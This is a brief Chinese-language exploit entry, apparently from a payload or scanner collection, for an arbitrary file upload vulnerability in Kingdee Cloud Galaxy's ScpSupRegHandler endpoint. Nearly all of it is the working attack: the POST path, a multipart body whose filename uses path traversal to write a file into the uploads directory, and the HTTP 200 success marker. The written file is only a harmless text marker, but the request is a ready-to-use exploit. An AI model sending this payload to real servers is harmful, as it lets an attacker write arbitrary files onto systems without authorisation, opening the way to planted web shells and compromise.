# 金蝶OA云星空ScpSupRegHandler任意文件上传漏洞

金蝶 ｜ 文件上传 ｜ —
- **请求**：`POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1`

**Payload**
```
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="dbId_v"
.
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FID"
2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/dudesuite.txt"
Content-Type: text/plain
dudesuite
--2ac719f8e29343df94aa4ab49e456061--
```
- **响应特征**：200